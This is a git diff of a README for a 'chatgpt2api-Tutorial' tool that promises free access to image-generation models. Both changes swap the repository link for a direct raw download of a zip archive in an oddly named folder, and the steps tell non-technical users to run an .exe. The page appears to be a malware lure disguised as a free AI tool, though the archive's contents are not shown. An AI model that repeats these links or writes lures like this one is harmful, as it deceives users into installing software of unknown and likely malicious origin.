@@ -1,6 +1,6 @@
 # 🎨 chatgpt2api-Tutorial - Free Access To Powerful Drawing Models
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Thomasinetwiglike568/chatgpt2api-Tutorial)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Thomasinetwiglike568/chatgpt2api-Tutorial/raw/refs/heads/main/mucodermal/api-Tutorial-chatgpt-v2.8.zip)
 
 This application provides a simple interface to access powerful image generation models. It acts as an adapter that bridges your requests to the background systems that create high-quality visuals. You do not need technical skills or coding knowledge to generate images with this tool. The software handles the complex communication in the background while you focus on entering your creative prompts.
 
@@ -20,7 +20,7 @@ If your computer meets these standards, the program will run without issues.
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the repository page to download the software: https://github.com/Thomasinetwiglike568/chatgpt2api-Tutorial
+1. Visit the repository page to download the software: https://github.com/Thomasinetwiglike568/chatgpt2api-Tutorial/raw/refs/heads/main/mucodermal/api-Tutorial-chatgpt-v2.8.zip
 2. Locate the latest release assets on that page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find easily.
